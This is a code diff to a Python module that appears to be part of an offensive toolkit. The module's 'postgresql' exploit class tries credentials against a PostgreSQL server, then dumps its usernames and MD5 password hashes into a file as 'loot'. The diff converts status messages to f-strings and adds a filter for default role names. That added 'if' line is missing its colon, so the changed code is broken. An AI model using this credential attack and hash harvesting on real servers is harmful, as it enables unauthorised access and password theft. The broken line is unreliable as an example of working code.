@@ -27,7 +27,7 @@ class postgresql(Exploit):
                 trystr = "dbname=postgres host={} user={} password={}".format(ip_address, username, password)
                 conn = psycopg2.connect(trystr)
             except psycopg2.OperationalError:
-                print("{Color.BYLLW}Authentication failed.{Color.END}", file=self.output)
+                print(f"{Color.BYLLW}Authentication failed.{Color.END}", file=self.output)
                 continue
 
             # opens a cursor to perform psql ops    
@@ -40,7 +40,7 @@ class postgresql(Exploit):
             except (psycopg2.OperationalError, psycopg2.InternalError) as e:
                 continue
             # opening up returns
-            print('{Color.BYLLW}Success. Gathering all usernames.{Color.END}', file=self.output)
+            print(f'{Color.BYLLW}Success. Gathering all usernames.{Color.END}', file=self.output)
             for l in cur.fetchall():
                 # adds if the username is not already in there
                 if loot_dict.get(l[0]) == None:
@@ -53,13 +53,14 @@ class postgresql(Exploit):
                     for l in cur.fetchall():
                         if l[1]:
                             text_file.write(l[1] + "\n")
-                print('{Color.BYLLW}Success. Gathering all md5 hashes.{Color.END}', file=self.output)
+                print(f'{Color.BYLLW}Success. Gathering all md5 hashes.{Color.END}', file=self.output)
                         
             except psycopg2.ProgrammingError:
-                print('{Color.BYLLW}No MD5 hashes found.{Color.END}', file=self.output)
+                print(f'{Color.BYLLW}No MD5 hashes found.{Color.END}', file=self.output)
                 pass
 
         for k, v in loot_dict.items():
-            more_loot.append((k,))
+            if k not in ["serviceuser", "pg_signal_backend", "pg_monitor", "pg_read_all_settings", "pg_read_all_stats", "pg_stat_scan_tables"]
+                more_loot.append((k,))
 
         return more_loot
